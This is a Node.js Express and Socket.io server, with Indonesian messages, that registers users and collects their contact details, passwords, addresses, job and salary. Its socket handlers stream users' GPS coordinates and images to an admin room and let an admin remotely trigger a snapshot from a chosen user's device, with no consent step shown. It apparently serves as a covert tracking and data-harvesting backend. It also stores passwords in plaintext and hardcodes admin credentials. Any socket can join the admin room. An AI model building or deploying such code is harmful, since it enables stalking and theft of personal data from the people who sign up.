const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.static('public'));

// In-Memory Database (Reset saat server restart)
const users = [];
const ADMIN_CREDENTIALS = { email: "admin@system.com", password: "adminsecretpassword" };

// --- REST API ENDPOINTS ---

app.post('/api/register', (req, res) => {
    const { fullName, birthDay, birthMonth, birthYear, whatsapp, email, password } = req.body;
    if (!fullName || !email || !password || !whatsapp) {
        return res.status(400).json({ success: false, message: 'Data tidak lengkap.' });
    }
    if (users.find(u => u.email === email)) {
        return res.status(400).json({ success: false, message: 'Email sudah terdaftar!' });
    }

    const newUser = {
        id: Date.now().toString(),
        fullName,
        birthDate: `${birthDay} ${birthMonth} ${birthYear}`,
        whatsapp, email, password,
        isProfileComplete: false // Status awal sebelum isi form pelengkap
    };
    users.push(newUser);
    res.json({ success: true, message: 'Pendaftaran berhasil!' });
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    const user = users.find(u => u.email === email && u.password === password);
    if (!user) return res.status(401).json({ success: false, message: 'Email atau password salah!' });

    res.json({
        success: true,
        user: { fullName: user.fullName, email: user.email, isProfileComplete: user.isProfileComplete }
    });
});

app.post('/api/complete-profile', (req, res) => {
    const { email, birthPlace, fullAddress, currentAddress, lastJob, lastSalary } = req.body;
    const user = users.find(u => u.email === email);
    if (!user) return res.status(404).json({ success: false, message: 'User tidak ditemukan' });

    user.birthPlace = birthPlace;
    user.fullAddress = fullAddress;
    user.currentAddress = currentAddress;
    user.lastJob = lastJob;
    user.lastSalary = lastSalary;
    user.isProfileComplete = true; // Update status

    res.json({ success: true, message: 'Data diri berhasil disimpan!' });
});

app.post('/api/admin/login', (req, res) => {
    const { email, password } = req.body;
    if (email === ADMIN_CREDENTIALS.email && password === ADMIN_CREDENTIALS.password) {
        return res.json({ success: true, token: 'SESSION_ADMIN_KEY_SECURE_V011' });
    }
    return res.status(401).json({ success: false, message: 'Kredensial Admin Salah!' });
});

// --- SOCKET.IO ---

io.on('connection', (socket) => {
    socket.on('join', (data) => {
        if (data === 'admin') {
            socket.join('admin_room');
        } else if (data && data.role === 'user') {
            socket.userName = data.name;
        }
    });

    socket.on('send_data', (data) => {
        io.to('admin_room').emit('receive_data', {
            userId: socket.id,
            userName: data.userName,
            latitude: data.latitude,
            longitude: data.longitude,
            image: data.image,
            timestamp: new Date().toLocaleTimeString()
        });
    });

    socket.on('request_snapshot', (targetUserId) => {
        io.to(targetUserId).emit('trigger_snapshot');
    });

    socket.on('disconnect', () => {
        io.to('admin_room').emit('user_disconnected', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`[V.0.1.1] Server berjalan di port ${PORT}`));